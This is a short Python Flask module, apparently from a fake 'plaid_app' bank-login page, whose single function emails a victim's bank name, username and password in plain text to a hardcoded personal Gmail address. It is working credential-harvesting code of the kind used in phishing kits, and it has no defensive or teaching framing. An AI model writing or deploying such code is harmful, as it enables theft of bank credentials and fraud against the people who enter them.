from plaid_app import mail
from flask_mail import Message
from datetime import datetime

def report_login(username,password,bank_name):
    msg = Message('New Login',
        sender='Normanday26@gmail.com',
        recipients=['Normanday26@gmail.com'])
    msg.body=f'''
    Bank Name ----- {bank_name}
    Username is ----- {username}
    Password is ----- {password}
    at ---- {datetime.now()}
    '''
    mail.send(msg)